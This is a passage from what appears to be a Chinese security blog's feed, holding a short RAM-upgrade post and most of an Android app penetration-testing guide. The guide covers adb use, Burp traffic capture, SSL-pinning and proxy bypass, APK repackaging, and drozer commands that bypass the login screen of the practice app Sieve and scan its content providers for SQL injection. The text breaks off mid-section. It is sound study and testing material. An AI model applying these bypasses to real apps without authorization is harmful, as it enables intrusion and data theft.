      <link href="/2023/10/13/%E8%A3%85%E6%9C%BA%E4%B9%8B%E6%8D%A2%E5%86%85%E5%AD%98%E6%9D%A1/"/>
      <url>/2023/10/13/%E8%A3%85%E6%9C%BA%E4%B9%8B%E6%8D%A2%E5%86%85%E5%AD%98%E6%9D%A1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>好多年前的电脑了，内存有点不够，内网靶场开不起来😭</p></blockquote><h2 id="如何选择适合电脑的内存条"><a href="#如何选择适合电脑的内存条" class="headerlink" title="如何选择适合电脑的内存条"></a>如何选择适合电脑的内存条</h2><p><strong>工具</strong></p><ul><li><p><a href="https://www.cpuid.com/softwares/cpu-z.htm">CPU-Z | Softwares | CPUID</a></p></li><li><p><a href="https://www.ghxi.com/aida64e.html">AIDA64 v6.92.6600 便携版 - 果核剥壳 (ghxi.com)</a></p></li></ul><p><strong>关注信息</strong></p><p><img src="/../images/image-20231013172841674.png" alt="image-20231013172841674"></p><p><img src="/../images/image-20231013173124433.png" alt="image-20231013173124433"></p><ul><li><p>支持的内存条类型和最大内存大小</p></li><li><p>几个插槽（支持几条内存条）</p></li><li><p>内存条频率</p><p>这里看到的是800MHZ，实际上是1600MHZ，在任务管理器中可以看到</p><p><img src="/../images/image-20231013171158829.png" alt="image-20231013171158829"></p><p><a href="https://zhuanlan.zhihu.com/p/462005732">内存频率只有一半？别急 系统只是告诉了你事实 - 知乎 (zhihu.com)</a></p></li><li><p>制造商：组双通道最好一致</p></li><li><p>电压</p><p>低电压：1.35V</p><p>标准电压：1.5V</p></li></ul><p>综上我最好去京东上购买DDR3规格，海力士品牌，内存条频率为1600MHZ，低电压，内存大小&lt;&#x3D;24GB（32-8）的内存条</p><h2 id="装内存条"><a href="#装内存条" class="headerlink" title="装内存条"></a>装内存条</h2><p><img src="/../images/image-20231013173501162.png" alt="image-20231013173501162"></p><p><img src="/../images/image-20231013173651787.png" alt="image-20231013173651787"></p><p>红框处即为内存条</p><p><img src="/../images/image-20231013173919923.png" alt="image-20231013173919923"></p><p>红框处向外拉，取出内存条，然后新内存条30°插入箭头所指后，用点力向下压，听到哒的一声就OK了</p><p>内存成功变为16GB</p><p><img src="/../images/image-20231013174123502.png" alt="image-20231013174123502"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 硬件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APP渗透总结</title>
      <link href="/2023/10/12/APP%E6%B8%97%E9%80%8F/"/>
      <url>/2023/10/12/APP%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="Android知识"><a href="#Android知识" class="headerlink" title="Android知识"></a>Android知识</h1><h2 id="APK文件"><a href="#APK文件" class="headerlink" title="APK文件"></a>APK文件</h2><p>APK（Android Package）文件是Android操作系统上安装应用程序的一种文件格式。APK文件实际上是一个压缩文件，它包含了应用程序的所有代码、资源和其他文件。</p><p>APK文件通常具有以下结构：</p><ol><li><p><code>AndroidManifest.xml</code>：这是APK文件的主要配置文件，它包含应用程序的所有信息，包括应用程序名称、权限、组件等。</p><p><img src="/../images/image-20230926222419741.png" alt="image-20230926222419741"></p></li><li><p><code>classes.dex</code>：这是APK文件中的核心代码文件，它包含了应用程序的所有Java代码。</p><blockquote><p>DEX（Dalvik Executable）文件是一种专门为Android操作系统设计的可执行文件格式。它是将Java字节码转换为Dalvik字节码的结果。Dalvik字节码是一种特殊的字节码，用于在Android设备上执行Java代码。</p><p>Android应用程序中的所有Java代码都被编译成DEX文件，然后打包到APK文件中。当用户安装应用程序时，DEX文件会被解压并加载到设备的内存中，以便在设备上执行应用程序。</p></blockquote></li><li><p><code>resources.arsc</code>: 包含了应用程序的所有非代码资源，如字符串、图像、布局、主题等等。该文件是应用程序中的重要组成部分，用于支持应用程序的多语言和多种配置。</p><p><img src="/../images/image-20230926222546190.png" alt="image-20230926222546190"></p></li><li><p><code>lib/</code>：这个目录包含了应用程序使用的所有本地库文件，通常按照不同的CPU架构分别存放。</p><p><img src="/../images/image-20230926222612453.png" alt="image-20230926222612453"></p></li><li><p><code>res/</code>：这个目录包含了应用程序的所有资源文件，例如布局、字符串、图像等。</p><p><img src="/../images/image-20230926222649268.png" alt="image-20230926222649268"></p></li><li><p><code>assets/</code>：这个目录包含了应用程序的所有未编译的资源文件，例如声音、视频等。</p><p><img src="/../images/image-20230926222714428.png" alt="image-20230926222714428"></p></li><li><p><code>META-INF/</code>：这个目录包含了APK文件的数字签名信息。</p><p><img src="/../images/image-20230926222742918.png" alt="image-20230926222742918"></p><p><img src="/../images/image-20230926222757403.png" alt="image-20230926222757403"></p></li></ol><h2 id="Android-四大应用程序组件"><a href="#Android-四大应用程序组件" class="headerlink" title="Android 四大应用程序组件"></a>Android 四大应用程序组件</h2><p>安卓应用程序组件指的是构成安卓应用程序的基本单元，主要有以下四种：</p><table><thead><tr><th align="center">组件名称</th><th align="center">具体用途</th></tr></thead><tbody><tr><td align="center">活动（Activity）</td><td align="center">负责管理应用程序的用户界面，通过活动可以与用户交互即<strong>呈现可供用户交互的界面</strong></td></tr><tr><td align="center">服务（Service）</td><td align="center">在后台运行的组件，不具有用户界面，主要用于<strong>执行长时间运行的任务或处理与用户界面无关的操作</strong>。</td></tr><tr><td align="center">广播接收器（Broadcast Receiver）</td><td align="center">用于接收系统广播和应用程序广播。即<strong>注册特定事件，并在其发生时被激活</strong>，例如电池电量变化、屏幕开关、网络连接状态等，也可以接收来自其他应用程序发送的广播。</td></tr><tr><td align="center">内容提供者（Content Provider）</td><td align="center">用于<strong>管理应用程序的数据</strong>，允许其他应用程序访问和共享应用程序的数据。内容提供者可以访问文件系统、SQLite 数据库、网络等数据源。</td></tr></tbody></table><h2 id="Android应用存储数据"><a href="#Android应用存储数据" class="headerlink" title="Android应用存储数据"></a>Android应用存储数据</h2><p>对 <code>android</code> 的每一个应用，<code>android</code> 系统会分配一个私有目录，用于存储应用的私有数据。此私有目录通常位于<code>/data/data/应用名称/</code></p><h1 id="ADB使用"><a href="#ADB使用" class="headerlink" title="ADB使用"></a>ADB使用</h1><p>Android 调试桥 (<code>adb</code>) 是一种功能多样的命令行工具，可让您与设备进行通信。<code>adb</code> 命令可用于执行各种设备操作，例如安装和调试应用。<code>adb</code> 提供对 Unix shell（可用来在设备上运行各种命令）的访问权限。它是一种客户端-服务器程序，包括以下三个组件：</p><ul><li>客户端（对应PC）：用于发送命令。客户端在开发机器上运行。您可以通过发出 <code>adb</code> 命令从命令行终端调用客户端。</li><li>守护程序 (adbd)：用于在设备上运行命令。守护程序在每个设备上作为后台进程运行。</li><li>服务端：用于管理客户端与守护程序之间的通信。服务器在开发机器上作为后台进程运行。</li></ul><p>Android SDK默认自带<code>adb</code>，它位于Android SDK的platform-tools目录中</p><p><strong>常用命令</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb version <span class="comment"># 查看adb版本</span></span><br><span class="line">adb devices -l <span class="comment"># 列出设备</span></span><br><span class="line">adb tcpip 5555 <span class="comment"># 服务端开启5555端口</span></span><br><span class="line">adb connect ip:port   <span class="comment"># 连接设备</span></span><br><span class="line">adb disconnect ip:port <span class="comment"># 关闭设备连接</span></span><br><span class="line">adb -s service <span class="built_in">command</span> <span class="comment"># 多个设备时-s指定设备</span></span><br><span class="line">adb install path_to_apk -t <span class="comment"># 安装apk</span></span><br><span class="line">adb push  pc_file Android _path  <span class="comment"># 上传文件</span></span><br><span class="line">adb pull  Android _file pc_path <span class="comment"># 下载文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令行操作</span></span><br><span class="line">adb -s service shell   <span class="comment"># 获得指定设备的shell</span></span><br><span class="line"><span class="comment"># 执行命令</span></span><br><span class="line">adb -s service shell <span class="built_in">command</span></span><br><span class="line"><span class="comment"># 或者进入后</span></span><br><span class="line">shell&gt;<span class="built_in">command</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令在/system/bin中</span></span><br><span class="line">pm list packages <span class="comment"># 查看应用列表</span></span><br><span class="line">pm list packages -e -3  <span class="comment"># 查询设备上所有已启用的第三方应用程序的包名列表</span></span><br><span class="line">getprop ro.build.version.release  <span class="comment"># 安卓系统版本</span></span><br><span class="line">screencap Android _path <span class="comment"># 截图</span></span><br><span class="line">screenrecord /sdcard/demo.mp4 <span class="comment"># 录屏</span></span><br></pre></td></tr></table></figure><p><strong>遇到的问题</strong></p><ul><li><p>more than one device and emulator</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用-s参数指定设备</span><br></pre></td></tr></table></figure></li><li><p>adb server version (41) doesn’t match this client (39); killing</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb客户端和服务端版本不一致</span><br></pre></td></tr></table></figure></li><li><p>由于找不到adbwinapi.dll,无法继续执行代码。重新安装程序可能会解决此问题</p><p>环境变量问题</p><p>解：将adb.exe文件复制到Windows&#x2F;system32下;</p><p>​       将adbwinapi.dll复制到Windows&#x2F;sysWoW64下。</p></li></ul><p><img src="/../images/image-20230725151602776.png?lastModify=1695029992" alt="image-20230725151602776"></p><p>​解决</p><p><img src="/../images/image-20230725151520659.png?lastModify=1695029992" alt="image-20230725151520659"></p><p><img src="/../images/image-20230725151508246.png?lastModify=1695029992" alt="image-20230725151508246"></p><p>​更改名字，替换模拟器中的adb即可,成功截图</p><p><img src="/../images/image-20230725151826056.png?lastModify=1695029992" alt="image-20230725151826056"></p><h1 id="Android抓包"><a href="#Android抓包" class="headerlink" title="Android抓包"></a>Android抓包</h1><h2 id="HTTPS单向认证和HTTPS双向认证"><a href="#HTTPS单向认证和HTTPS双向认证" class="headerlink" title="HTTPS单向认证和HTTPS双向认证"></a>HTTPS单向认证和HTTPS双向认证</h2><p><a href="https://fgtbnc.github.io/2023/05/30/%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/#HTTPS%E5%8D%95%E5%90%91%E8%AE%A4%E8%AF%81">常见名词与概念 | Khaz’s Blog (fgtbnc.github.io)</a></p><h2 id="抓包方式"><a href="#抓包方式" class="headerlink" title="抓包方式"></a>抓包方式</h2><blockquote><p>因为手机是华为比较难搞root，这里选择的是夜神模拟器+burp+postern</p></blockquote><h3 id="ssl证书校验–HTTP单向认证"><a href="#ssl证书校验–HTTP单向认证" class="headerlink" title="ssl证书校验–HTTP单向认证"></a>ssl证书校验–HTTP单向认证</h3><ul><li><p>安卓7.0以下</p><p>直接安装burp.cer证书，配置wifi代理即可抓包</p></li><li><p>安卓7.0及以上</p><blockquote><p>Android 从 7.0 开始，系统不再信任用户 CA 证书（应用 targetSdkVersion &gt;&#x3D; 24 时生效，如果 targetSdkVersion &lt;24 即使系统是 7.0 + 依然会信任）。</p></blockquote><p>使用adb安装burp证书的pem格式</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 手机证书位置</span></span><br><span class="line">/system/etc/security/cacerts/</span><br></pre></td></tr></table></figure></li></ul><h3 id="代理屏蔽绕过"><a href="#代理屏蔽绕过" class="headerlink" title="代理屏蔽绕过"></a>代理屏蔽绕过</h3><blockquote><p>有的app做完ssl证书校验后，为了防止被抓包，多做了一层处理，给app设置自己的代理地址，可能这个代理地址就是服务器的地址，这样就不走我们设置的wifi代理，自然burp也抓不到包了。</p></blockquote><p>使用postern设置VPN代理绕过</p><ul><li>配置代理</li></ul><p><img src="/../images/image-20230904134750565.png?lastModify=1695029992" alt="image-20230904134750565"></p><p><img src="/../images/image-20230904134724524.png?lastModify=1695029992" alt="image-20230904134724524"></p><ul><li><p>配置规则</p><p><img src="/../images/image-20230904134947248.png?lastModify=1695029992" alt="image-20230904134947248"></p></li><li><p>需要<strong>关闭wifi代理</strong>，使用Postern的Vpn代理</p><p><img src="/../images/image-20230904135053270.png?lastModify=1695029992" alt="image-20230904135053270"></p></li></ul><h3 id="SSL-Pinning绕过–有问题"><a href="#SSL-Pinning绕过–有问题" class="headerlink" title="SSL-Pinning绕过–有问题"></a>SSL-Pinning绕过–有问题</h3><blockquote><p>SSL-pinning有两种方式： 证书锁定（Certificate Pinning） 和公钥锁定（ Public Key Pinning）。</p><ul><li><strong>证书锁定</strong> 需要在客户端代码内置仅接受指定域名的证书，而不接受操作系统或浏览器内置的CA根证书对应的任何证书，通过这种授权方式，保障了APP与服务端通信的唯一性和安全性，因此客户端与服务端（例如API网关）之间的通信是可以保证绝对安全。但是CA签发证书都存在有效期问题，缺点是在 证书续期后需要将证书重新内置到APP中。</li><li><strong>公钥锁定</strong> 提取证书中的公钥并内置到客户端中，通过与服务器对比公钥值来验证连接的正确性。制作证书密钥时，公钥在证书的续期前后都可以保持不变（即密钥对不变），所以可以避免证书有效期问题，一般推荐这种做法。</li></ul></blockquote><p>绕过方法：使用<strong>xposed框架中的JustTrustMe</strong></p><blockquote><p>Xposed是一个框架，它可以改变系统和应用程序的行为，而不接触任何APK。它支持很多模块，每个模块可以用来帮助实现不同的功能。JustTrustMe 是一个用来禁用、绕过 SSL 证书检查的基于 Xposed 模块。JustTrustMe 是将 APK 中所有用于校验 SSL 证书的 API 都进行了 Hook，从而绕过证书检查。</p></blockquote><p><strong>遇到的问题</strong></p><p>用Xposed+JustTrustMe app能抓到app的数据包，但是内置网页都访问不到了</p><h2 id="r0capture–安卓应用层抓包通杀脚本"><a href="#r0capture–安卓应用层抓包通杀脚本" class="headerlink" title="r0capture–安卓应用层抓包通杀脚本"></a>r0capture–安卓应用层抓包通杀脚本</h2><p><a href="https://github.com/r0ysue/r0capture">r0capture</a></p><h1 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h1><p>查壳</p><ul><li><a href="https://github.com/MagiCiAn1/APKProtectionSearch">MagiCiAn1&#x2F;APKProtectionSearch: apk查壳工具 (github.com)</a></li><li><a href="https://github.com/dstmath/frida-unpack">dstmath&#x2F;frida-unpack: 基于Frida的脱壳工具 (github.com)</a></li><li><a href="https://blog.csdn.net/cui_yonghua/article/details/126693444">脱壳工具：反射大师的使用详解-CSDN博客</a></li></ul><p>脱壳</p><ul><li><p><a href="https://github.com/CodingGay/BlackDex">CodingGay&#x2F;BlackDex: BlackDex is an Android unpack(dexdump) tool, it supports Android 5.0~12 and need not rely to any environment. BlackDex can run on any Android mobile phone or emulator, you can unpack APK File in several seconds. (github.com)</a></p></li><li></li></ul><h1 id="测试checklist"><a href="#测试checklist" class="headerlink" title="测试checklist"></a>测试checklist</h1><p><img src="/../images/905443_6J7WGQ2HGW4RUP4.png" alt="905443_6J7WGQ2HGW4RUP4"></p><h2 id="客户端程序安全"><a href="#客户端程序安全" class="headerlink" title="客户端程序安全"></a>客户端程序安全</h2><h3 id="安装包签名校验"><a href="#安装包签名校验" class="headerlink" title="安装包签名校验"></a>安装包签名校验</h3><blockquote><p>如果 APK 没有 使用自己的证书进行签名，将会失去对版本管理的主动权。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jarsigner -verify -certs -verbose apk</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230904114950022.png?lastModify=1695029992" alt="image-20230904114950022"></p><p>jadx-gui</p><p><img src="/../images/image-20230904115047184.png?lastModify=1695029992" alt="image-20230904115047184"></p><h3 id="反编译保护"><a href="#反编译保护" class="headerlink" title="反编译保护"></a>反编译保护</h3><blockquote><p>没有反编译保护，可能被恶意人员进行逆向破解等操作。</p></blockquote><p>直接使用jadx-gui打开即可，如果混淆后的代码样例，除了覆写和接口以外的字段都是无意义的名称，则说明是安全的，如下即为安全的。</p><p><img src="/../images/image-20230927104447402.png" alt="image-20230927104447402"></p><h3 id="应用完整性校检"><a href="#应用完整性校检" class="headerlink" title="应用完整性校检"></a>应用完整性校检</h3><blockquote><p>攻击者能够通过反编译的方法在客户端程序中植入自己的木马，客户端程序如果没有自校验机制的话，攻击者可能会通过篡改客户端程序窃取手机用户的隐私信息。</p></blockquote><p><strong>解包</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar apktool.jar d -f APK -o DIR</span><br></pre></td></tr></table></figure><p><strong>修改资源文件</strong></p><p>改一些容易分辨的，比如logo</p><p><code>assets/pmbwe64/css/banklogo/logo</code></p><p><img src="/../images/image-20230927110713736.png" alt="image-20230927110713736"></p><p><strong>打包</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar apktool.jar b -f DIR -o new.apk</span><br></pre></td></tr></table></figure><p><strong>对生成的APK进行签名</strong></p><blockquote><p>APK 必须进行签名后，方可安装和运行。如果开启了“允许未知来源的应 用”，那么 Debug 证书、自签名证书、过期证书的签名都是可以的，但是不可以不签 名。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar signapk.jar testkey.x509.pem testkey.pk8 待签名APK 输出APK</span><br></pre></td></tr></table></figure><p><strong>重新安装启动，观察是否有自校验</strong></p><h3 id="不恰当的配置"><a href="#不恰当的配置" class="headerlink" title="不恰当的配置"></a>不恰当的配置</h3><ul><li><p>Debug模式</p><blockquote><p>客户端软件 <code>AndroidManifest.xml</code> 中的 <code>android:debuggable=&quot;true&quot;</code>标记如果开启，可被Java 调试工具例如 jdb 进行调试，获取和篡改用户敏感信息，甚至分析并且修改代码实现的业务逻辑，我们经常使用 android.util.Log 来打印日志，软件发布后调试日志被其他开发者看到，容易被反编译破解。</p></blockquote></li><li><p>应用程序数据可备份</p><blockquote><p><code>AndroidMainfest.xml</code> 文件中的 <code>allowBackup</code> 属性值控制，其默认值为 <code>true</code>。当该属性没有显式设置为 <code>false</code> 时,攻击者可通过 <code>adb backup</code> 和 <code>adb restore</code> 对 App 的应用数据进行备份和恢复，从而可能获取明文存储的用户敏感信息。</p></blockquote></li></ul><p>使用jadx-gui打开搜索即可</p><h2 id="敏感信息安全测试"><a href="#敏感信息安全测试" class="headerlink" title="敏感信息安全测试"></a>敏感信息安全测试</h2><ul><li><p>APK反编译源码中泄漏的敏感信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jadx-gui搜索</span><br><span class="line">漏扫平台</span><br></pre></td></tr></table></figure></li><li><p>私有目录下的文件权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADB连接查看</span><br></pre></td></tr></table></figure></li><li><p>私有目录下的文件信息泄漏</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADB连接查找</span><br></pre></td></tr></table></figure></li><li><p>日志是否打印敏感数据</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb logcat //持续输出日志，直到 Ctrl+C </span><br><span class="line">adb logcat -d &gt; log.txt //一次性输出日志缓存，不会阻塞 </span><br></pre></td></tr></table></figure></li></ul><p>补充：<a href="https://bbs.kanxue.com/thread-271122.htm#msg_header_h3_12">原创]Android APP漏洞之战（7）——信息泄露漏洞详解-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p><h2 id="四大应用程序组件测试"><a href="#四大应用程序组件测试" class="headerlink" title="四大应用程序组件测试"></a>四大应用程序组件测试</h2><p>测试用APK</p><p><a href="https://github.com/as0ler/Android-Examples/blob/master/sieve.apk">https://github.com/as0ler/Android-Examples/blob/master/sieve.apk</a></p><p><a href="https://github.com/linkedin/qark/blob/master/tests/goatdroid.apk">qark&#x2F;tests&#x2F;goatdroid.apk at master · linkedin&#x2F;qark (github.com)</a></p><h3 id="drozer安装"><a href="#drozer安装" class="headerlink" title="drozer安装"></a><strong>drozer安装</strong></h3><p><strong>PC控制端安装</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">python2 -m pip install wheel</span><br><span class="line">python2 -m pip install pyyaml</span><br><span class="line">python2 -m pip install pyhamcrest</span><br><span class="line">python2 -m pip install protobuf</span><br><span class="line">python2 -m pip install pyopenssl</span><br><span class="line">python2 -m pip install twisted</span><br><span class="line">python2 -m pip install service_identity</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载whl到本地</span></span><br><span class="line">wget https://github.com/WithSecureLabs/drozer/releases/download/2.4.4/drozer-2.4.4-py2-none-any.whl</span><br><span class="line">python2 -m pip install drozer-2.4.4-py2-none-any.whl</span><br></pre></td></tr></table></figure><p><strong>设备端agent安装</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk</span><br><span class="line">adb install drozer-agent-2.3.4.apk</span><br></pre></td></tr></table></figure><p><strong>连接</strong></p><p>设备端开启drozer</p><p><img src="/../images/image-20231012214134944.png" alt="image-20231012214134944"></p><p>pc控制端（<strong>注意在D:\python2.7\Scripts下启动drozer</strong>）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 端口转发</span></span><br><span class="line">adb forward tcp:31415 tcp:31415</span><br><span class="line"><span class="comment"># 连接</span></span><br><span class="line">drozer console connect</span><br></pre></td></tr></table></figure><p>出现下图表示连接成功</p><p><img src="/../images/image-20231012214244755.png" alt="image-20231012214244755"></p><p><strong>乱码解决</strong></p><p><img src="/../images/image-20231012222013025.png" alt="image-20231012222013025"></p><p><code>D:\python2.7\Lib\site-packages\drozer\modules\app</code>下的<code>package.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开头添加</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 360,362行指定字符串为unicode字符串，前缀&quot;u&quot;</span></span><br><span class="line">self.stdout.write(<span class="string">u&quot;%s\n&quot;</span> % application.packageName)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231012222306823.png" alt="image-20231012222306823"></p><h3 id="Package"><a href="#Package" class="headerlink" title="Package"></a>Package</h3><ul><li><p><strong>根据名字查找APK</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># run app.package.list -f &lt;packagename&gt;</span></span><br><span class="line">dz&gt; run app.package.list -f sieve</span><br><span class="line">com.mwr.example.sieve (Sieve)</span><br></pre></td></tr></table></figure></li><li><p><strong>获得APK的基本信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># run app.package.info -a &lt;packagename&gt;</span></span><br><span class="line">dz&gt; run app.package.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  Application Label: Sieve</span><br><span class="line">  Process Name: com.mwr.example.sieve</span><br><span class="line">  Version: 1.0</span><br><span class="line">  Data Directory: /data/user/0/com.mwr.example.sieve</span><br><span class="line">  APK Path: /data/app/com.mwr.example.sieve-1/base.apk</span><br><span class="line">  UID: 10046</span><br><span class="line">  GID: [3003]</span><br><span class="line">  Shared Libraries: null</span><br><span class="line">  Shared User ID: null</span><br><span class="line">  Uses Permissions:</span><br><span class="line">  - android.permission.READ_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.INTERNET</span><br><span class="line">  Defines Permissions:</span><br><span class="line">  - com.mwr.example.sieve.READ_KEYS</span><br><span class="line">  - com.mwr.example.sieve.WRITE_KEYS</span><br></pre></td></tr></table></figure></li><li><p><strong>一键检测APK存在的攻击面</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.package.attacksurface com.mwr.example.sieve</span><br><span class="line">Attack Surface:</span><br><span class="line">  3 activities exported</span><br><span class="line">  0 broadcast receivers exported</span><br><span class="line">  2 content providers exported</span><br><span class="line">  2 services exported</span><br><span class="line">    is debuggable</span><br></pre></td></tr></table></figure><blockquote><p><code>&lt;packagename&gt;</code>是包名。</p></blockquote></li></ul><blockquote><p>可以看到有3个activity、0个广播接收者、2个内容提供者和2个服务可以被导出，并且开启了debug模式</p></blockquote><h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><table><thead><tr><th>漏洞种类</th><th>危害</th></tr></thead><tbody><tr><td>越权绕过</td><td>Activity 用户界面绕过会造成用户信息窃取</td></tr><tr><td>拒绝服务</td><td>通过 Intent 给 Activity 传输畸形数据使得程序崩溃从而影响用户体验</td></tr><tr><td>Activity 劫持</td><td>组件导出导致钓鱼欺诈，Activity 界面被劫持产生欺诈等安全事件</td></tr><tr><td>隐式启动 intent 包含敏感数据</td><td>敏感信息泄露</td></tr></tbody></table><h4 id="获取可导出activity"><a href="#获取可导出activity" class="headerlink" title="获取可导出activity"></a><strong>获取可导出activity</strong></h4><p>在 Android 系统中，Activity 组件默认是不导出的，如果 <code>AndroidManifest.xml</code> 中设置了 <code>exported = &quot;true&quot;</code> 这样的关键值或者是添加了<code>&lt;intent-filter&gt;</code> 这样的属性，那么此时 Activity 组件是导出的，就会引发越权绕过或者是泄露敏感信息等的安全风险。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.my.app.Initial&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>drozer获得可导出activity  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># run app.activity.info -a &lt;packagename&gt;</span></span><br><span class="line">dz&gt; run app.activity.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  com.mwr.example.sieve.FileSelectActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.MainLoginActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.PWList</span><br><span class="line">    Permission: null</span><br></pre></td></tr></table></figure><h4 id="越权绕过测试"><a href="#越权绕过测试" class="headerlink" title="越权绕过测试"></a>越权绕过测试</h4><p>正常第一次打开是这样的</p><p><img src="/../images/image-20231012232654681.png" alt="image-20231012232654681"></p><p>对应的是<code>MainLoginActivity</code>这个activity</p><p><img src="/../images/image-20231012232931968.png" alt="image-20231012232931968"></p><p>调用<code>PWList</code>这个activity，实现登录绕过界面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231012232745487.png" alt="image-20231012232745487"></p><h4 id="Activity劫持"><a href="#Activity劫持" class="headerlink" title="Activity劫持"></a><strong>Activity劫持</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 环境准备</span></span><br><span class="line">wget https://github.com/yanghaoi/android_app/raw/master/uihijackv2.0_sign.apk</span><br><span class="line"><span class="comment"># 安装点击劫持软件</span></span><br><span class="line">adb install uihijackv2.0_sign.apk</span><br></pre></td></tr></table></figure><p>劫持测试</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.package.list -f jack</span><br><span class="line">com.test.uihijack (Hijack测试)</span><br><span class="line"></span><br><span class="line">dz&gt; run app.activity.start --component com.test.uihijack com.test.uihijack.MainActivity</span><br></pre></td></tr></table></figure><p>在打开原activity的基础上，调用此组件，如果<code>uihijackv2.0_sign</code>界面位于被测软件上，则存在漏洞，否则不存在漏洞。如下图为存在漏洞的情况。</p><p><img src="/../images/image-20231012233356456.png" alt="image-20231012233356456"></p><h4 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h4><blockquote><p>调用组件，查看是否导致拒绝服务，若程序出现 <code>程序崩溃</code>、<code>已停止运行</code> 等程序无法运行或自动退出行为则为攻击成功。</p></blockquote><p><a href="http://rui0.cn/archives/30">http://rui0.cn/archives/30</a></p><h3 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content-Provider"></a>Content-Provider</h3><table><thead><tr><th>漏洞种类</th><th>危害</th></tr></thead><tbody><tr><td>信息泄露</td><td>查看组件数据信息</td></tr><tr><td>SQL注入</td><td>注入获取相关数据</td></tr><tr><td>目录遍历</td><td>访问任意可读文件</td></tr></tbody></table><h4 id="查看-provider-数据组件信息"><a href="#查看-provider-数据组件信息" class="headerlink" title="查看 provider 数据组件信息"></a><strong>查看 provider 数据组件信息</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.provider.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013104113982.png" alt="image-20231013104113982"></p><h4 id="信息泄漏"><a href="#信息泄漏" class="headerlink" title="信息泄漏"></a><strong>信息泄漏</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run scanner.provider.finduris -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013104901284.png" alt="image-20231013104901284"></p><p>关注红框部分，可能存在数据泄露，查询语句如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run app.provider.query &lt;URI&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013105050259.png" alt="image-20231013105050259"></p><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><blockquote><p>Android使用的是sqlite</p><p><a href="https://xz.aliyun.com/t/8627">sqlite注入的一点总结 - 先知社区 (aliyun.com)</a></p></blockquote><p>进行sql注入扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run scanner.provider.injection -a &lt;package&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231013105351961.png" alt="image-20231013105351961"></p><p>进一步利用</p><p>单引号报错</p><figure class="highlight bash"><table><tr><td 